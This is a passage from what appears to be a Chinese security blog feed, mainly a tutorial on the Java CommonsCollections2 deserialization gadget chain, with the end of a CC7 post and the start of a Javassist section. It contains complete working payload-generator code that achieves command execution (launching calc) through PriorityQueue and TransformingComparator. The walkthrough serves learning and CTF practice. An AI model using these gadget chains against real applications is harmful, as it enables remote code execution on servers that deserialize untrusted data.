class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;?,?&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        HashMap&lt;?,?&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Map&lt;?,?&gt;, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc7.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CC链就此就讲完了，完结撒花*★,°<em>:.☆(￣▽￣)&#x2F;$:</em>.°★* </p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2反序列化链简析</title>
      <link href="/2025/12/22/CommonsCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/"/>
      <url>/2025/12/22/CommonsCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2反序列化链简析"><a href="#CommonsCollections2反序列化链简析" class="headerlink" title="CommonsCollections2反序列化链简析"></a>CommonsCollections2反序列化链简析</h1><p>JDK 8u71版本以后，对<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>进行了修复，此后不再调用<code>setValue()</code>方法。针对<code>LazyMap</code>路径，创建新的<code>LinkedHashMap</code>替换原本传入的<code>proxyMap</code>作为<code>memberValues</code>字段，不再直接对原本构造的<code>proxyMap</code>进行<code>EntrySet()</code>操作</p><br/><h2 id="依赖ChainedTransformer的CC2链构建路径"><a href="#依赖ChainedTransformer的CC2链构建路径" class="headerlink" title="依赖ChainedTransformer的CC2链构建路径"></a>依赖ChainedTransformer的CC2链构建路径</h2><p>该路径依然利用<code>ChainedTransformer</code>类的<code>transform()</code>方法进行链式调用，与CC1的不同点在于触发<code>transform()</code>方法的上层是<code>TransformingComparator</code>类的<code>compare()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>TransformingComparator</code>的构造器是公开方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>直接构造即可，此时的链便可改写为如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">transformingComparator.compare(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>此时会抛出一个异常，是返回值类型不匹配的原因，但此时命令已经执行完毕了，<del>故影响不大</del>（后面立即打脸），继续寻找上层，在<code>PriorityQueue</code>类的<code>siftDownUsingComparator()</code>方法调用了<code>compare()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftDownUsingComparator()</code>被同一个类的<code>siftDown()</code>方法调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftDown()</code>被同一个类的<code>heapify()</code>调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>heapify()</code>被则<code>readObject()</code>调用了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以构造链的起点在<code>PriorityQueue</code>类，类内部的调用顺序是<code>readObject()</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>compare()</code></p><p>我们需要<code>comparator</code>为构造好的<code>transformingComparator</code>对象用来触发<code>compare()</code>，在PriorityQueue类内的一个公开构造器可以直接赋值<code>comparator</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外在<code>heapify()</code>方法中，要进入for循环的条件是<code>size</code>&gt;&#x3D;2</p><blockquote><p><code>size &gt;&gt;&gt; 1</code>   size 除以 2<br><code>(size &gt;&gt;&gt; 1) - 1</code>   结果减 1<br><code>i &gt;= 0</code>   循环继续条件</p></blockquote><p>所以截止目前，链的样子已经几乎完整了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-1.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时运行程序会弹出两次计算器，但是这个链是失败的，如果在反序列化处打一个断点会发现程序实际上根本没有进行反序列化，而是提前终止了。这说明两次命令执行在序列化之前，之后就被抛出的异常终止了</p><p>调试程序，在<code>priorityQueue</code>调用<code>add()</code>时步入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> offer(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>程序执行了<code>offer()</code>方法，步入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一次调用<code>add()</code>时，直接放入元素，第二次调用<code>add()</code>时，会执行<code>siftUp()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftUpUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUpComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里设置了<code>comparator</code>为<code>transformingComparator</code>此时会进入<code>siftUpUsingComparator()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>siftUpUsingComparator()</code>也调用了<code>compare()</code>这就是程序在序列化前执行命令的原因，继续看<code>compare()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于在构造<code>transformingComparator</code>时使用了单参数的构造器，导致<code>this.decorated</code>被赋值为默认的<code>ComparatorUtils.NATURAL_COMPARATOR</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Comparator</span> <span class="variable">NATURAL_COMPARATOR</span> <span class="operator">=</span> ComparableComparator.comparableComparator();</span><br></pre></td></tr></table></figure><p>进入<code>ComparableComparator.comparableComparator()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; ComparableComparator&lt;E&gt; <span class="title function_">comparableComparator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该静态方法返回了<code>INSTANCE</code>字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ComparableComparator</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>();</span><br></pre></td></tr></table></figure><p>其实默认的<code>this.decorated</code>就是一个<code>ComparableComparator</code>实例，这个类的<code>compare()</code>方法决定了抛出异常的原因</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(E obj1, E obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> obj1.compareTo(obj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法接受两个泛型对象，从该类的签名中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComparableComparator</span>&lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;E&gt;, Serializable</span><br></pre></td></tr></table></figure><p>可以看到，接受的两个参数需要是<code>Comparable</code>接口的实现类，而在<code>PriorityQueue</code>类中执行<code>compare()</code>后的两个<code>value1</code>和<code>value2</code>返回的是命令执行的<code>Process</code>类型，这就是报错的原因</p><p>要解决的方法也很简单，在执行<code>add()</code>之前先不往<code>PriorityQueue</code>传入<code>transformingComparator</code>，那么在执行<code>siftUp()</code>时<code>comparator</code>字段为空，进入<code>siftUpComparable()</code>，不再调用<code>compare()</code>，<code>add()</code>执行完毕后再通过反射修改<code>comparator</code>为<code>transformingComparator</code>，至此整条链构建完毕</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, transformingComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-1.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下，我们反序列化了一个<code>PriorityQueue</code>对象，类内部的调用顺序是<code>readObject()</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>compare()</code>，之后的顺序则与CC1保持一致</p></br><h2 id="动态类加载机制"><a href="#动态类加载机制" class="headerlink" title="动态类加载机制"></a>动态类加载机制</h2><p>Java的动态类加载机制允许在程序运行时加载类对象，<code>Javassist</code>是一个Java字节码操作工具包，能够简化动态创建和修改类的过程。</p><h3 id="使用Javassist创建类"><a href="#使用Javassist创建类" class="headerlink" title="使用Javassist创建类"></a>使用Javassist创建类</h3><p>进行创建类之前，需要实例化一个<code>ClassPool</code>对象来创建类，可以使用其静态方法<code>getDefault()</code>获取</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br></pre></td></tr></table></figure><p><code>ClassPool</code>有<code>makeClass(</code>)方法用于构建类，需要传入一个字符串作为该类的名称，或者使用<code>get()</code>方法，传入的参数是该类的路径</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test2</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用<code>CtField</code>类的<code>make()</code>方法可以为创建的类设置属性，该方法传入属性的签名和操作的<code>CtClass</code>对象，属性签名需要手动添加分号。设置完成后使用<code>addField()</code>方法为创建的类添加该属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtField</span> <span class="variable">testField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public String testField;&quot;</span>,test);</span><br><span class="line">test.addField(testField);</span><br></pre></td></tr></table></figure><p>使用<code>CtMethod</code>类的<code>make()</code>方法可以为创建的类设置方法，该方法传入方法的签名和操作的<code>CtClass</code>对象，注意如果不写<code>{ }</code>程序会自动添加<code>abstract</code>修饰符。设置完成后使用<code>addMethod()</code>方法为创建的类添加该方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">testMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public String testMethod(String arg) &#123; return arg; &#125;&quot;</span>,test);</span><br><span class="line">test.addMethod(testMethod);</span><br></pre></td></tr></table></figure><p>使用<code>CtMethod</code>类的<code>setBody()</code>方法可以为其添加方法体</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">testMethod.setBody(<span class="string">&quot;System.out.println(\&quot;test\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过实例化<code>CtConstructor</code>类可与生成构造器，接受两个参数，一个是构造器接受的参数类型，一个是要操作的<code>CtClass</code>对象。设置完成后使用<code>addConstructor()</code>方法为创建的类添加该构造器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span>  <span class="title class_">CtClass</span>[]&#123;CtClass.intType&#125;, test);</span><br><span 